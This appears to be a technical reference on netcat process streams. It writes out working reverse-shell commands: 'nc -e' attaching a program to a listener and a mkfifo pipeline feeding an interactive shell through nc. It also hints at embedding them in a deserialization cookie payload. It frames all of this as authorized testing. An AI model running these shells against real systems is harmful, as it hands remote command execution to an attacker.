# Netcat process streams

Use this branch only for an explicitly authorized process/stream task with a trusted executable. Confirm the installed **traditional** netcat build actually supports `-e`; some builds omit it. Nmap Ncat has its own options, and OpenBSD's `-e`, where present, is a TLS peer-name check rather than executable attachment. An unsupported flag is an implementation mismatch, not a failed network route.

Define `peer_ip` as the owned numeric listener address, `port` as its selected TCP port and `program` as the reviewed absolute executable. Traditional netcat can connect that program's standard streams after connecting:

~~~bash
nc -n -v "$peer_ip" "$port" -e "$program"
~~~

This executes the program with the caller's available identity; it does not grant a new identity or authenticate the TCP peer. An interactive interpreter would expose the caller's command authority on this stream, so select that only when it is the authorized task and preserve the process/session's lifetime. A trusted marker program is useful when only invocation/transport needs confirmation. Do not place credentials on an unprotected TCP stream or assume the stream has SSH-like peer verification.

Traditional `-e` accepts an executable filename, not a full shell command string with arguments. Its `-c` option explicitly invokes a shell command string on supporting builds, introducing a separate parsing/execution boundary. Keep data out of such source strings; normal quoted arguments do not repair deliberate shell reparsing.

Start the corresponding controlled listener before the selected process invocation. Correlate received marker/output with that specific invocation and identify the actual process identity when privilege is relevant. Receipt of a connection alone does not establish program success; missing bytes can come from buffering, stdin/EOF behavior, an executable error or a network failure. A stream's lack of terminal features does not by itself invalidate command execution. Stop the owned process/connection when the task finishes; a terminated socket is not proof that every spawned descendant ended.

Reference: [traditional netcat execute, shell and stream options](https://manpages.debian.org/bookworm/netcat-traditional/nc.1.en.html).

## FIFO attachment without an execute option

For an explicitly authorized Linux process-stream task on a verified nc client without an executable-attachment option, a FIFO can feed received bytes to a selected interactive shell while its output goes back through nc. This is a separate shell/filesystem operation, not a special nc flag. Define `shell_bin` as the intended installed POSIX shell, `peer_ip`/`port` as the selected owned listener and `fifo_path` as a fresh absolute FIFO name in an owned private task directory. Start the two-way receiver first.

~~~bash
mkfifo -m 600 -- "$fifo_path" &&
  "$shell_bin" -i <"$fifo_path" 2>&1 | nc -n "$peer_ip" "$port" >"$fifo_path"
~~~

The FIFO is this shell's input; the anonymous pipe carries its stdout/stderr to nc, and nc writes received network bytes into the FIFO. `2>&1` follows the shell's pipe-bound stdout. Reading or writing a FIFO normally waits for its other end; a wrong path, existing file, permissions or a missing companion can block before any connection. Preserve a creation failure instead of deleting an existing `/tmp/f` to make a copied string work. The foreground command exposes the selected shell's existing authority; it does not create a PTY or raise privileges.

On the receiver, send only the task's selected commands and correlate their output/identity with this invocation. A connection or printed prompt alone is insufficient. Exit that shell, stop the tracked transport/children and remove only the FIFO created for this task after confirming they no longer use it. EOF behavior varies by nc implementation; a socket closing is not proof the shell or every descendant exited. If this command is placed inside a signed-cookie reduce callable, server deserialization is the execution boundary and inputs/quoting must survive that additional command-string parse. Building a cookie alone does not start the callback.

See [GNU mkfifo options](https://manpages.debian.org/trixie/coreutils/mkfifo.1.en.html) and [FIFO opening/blocking](https://man7.org/linux/man-pages/man3/mkfifo.3.html). Use the installed shell and nc contracts; this pipeline uses no traditional `-e` or OpenBSD TLS `-e` option.
